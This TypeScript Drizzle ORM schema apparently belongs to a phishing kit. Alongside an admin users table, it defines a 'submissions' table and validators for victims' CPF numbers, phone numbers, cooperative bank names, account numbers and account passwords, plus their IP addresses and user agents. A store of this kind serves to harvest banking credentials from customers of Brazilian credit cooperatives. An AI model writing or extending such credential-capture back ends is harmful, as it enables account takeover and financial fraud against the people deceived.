import { pgTable, text, serial, integer, boolean, timestamp } from "drizzle-orm/pg-core";
import { createInsertSchema } from "drizzle-zod";
import { relations } from "drizzle-orm";
import { z } from "zod";

// Admin users table
export const users = pgTable("users", {
  id: serial("id").primaryKey(),
  username: text("username").notNull().unique(),
  password: text("password").notNull(),
  createdAt: timestamp("created_at").defaultNow().notNull(),
});

// Define user relations
export const usersRelations = relations(users, ({ many }) => ({
  // A user could potentially be related to submissions in a future version
}));

export const insertUserSchema = createInsertSchema(users).pick({
  username: true,
  password: true,
});

export type InsertUser = z.infer<typeof insertUserSchema>;
export type User = typeof users.$inferSelect;

// Client submissions table
export const submissions = pgTable("submissions", {
  id: serial("id").primaryKey(),
  cpf: text("cpf").notNull(),
  phone: text("phone").notNull(),
  cooperative: text("cooperative").notNull(),
  account: text("account").notNull(),
  password: text("password").notNull(),
  ip: text("ip"),
  userAgent: text("user_agent"),
  createdAt: timestamp("created_at").defaultNow().notNull(),
});

// Define submission relations
export const submissionsRelations = relations(submissions, ({ one }) => ({
  // Submissions could be related to users in a future version
}));

export const insertSubmissionSchema = createInsertSchema(submissions).omit({
  id: true,
  createdAt: true,
});

// Input validation schemas
export const cpfSchema = z.string().regex(/^\d{3}\.\d{3}\.\d{3}-\d{2}$/, "CPF must be in the format 000.000.000-00");
export const phoneSchema = z.string().regex(/^\(\d{2}\) \d{5}-\d{4}$/, "Phone must be in the format (00) 00000-0000");
export const cooperativeSchema = z.string().min(3, "Cooperative must be at least 3 characters");
export const accountSchema = z.string().min(3, "Account must be at least 3 characters");
export const passwordSchema = z.string().min(4, "Password must be at least 4 characters");

// Full submission schema with validation
export const fullSubmissionSchema = z.object({
  cpf: cpfSchema,
  phone: phoneSchema,
  cooperative: cooperativeSchema,
  account: accountSchema,
  password: passwordSchema,
  ip: z.string().optional(),
  userAgent: z.string().optional(),
});

export type InsertSubmission = z.infer<typeof insertSubmissionSchema>;
export type Submission = typeof submissions.$inferSelect;
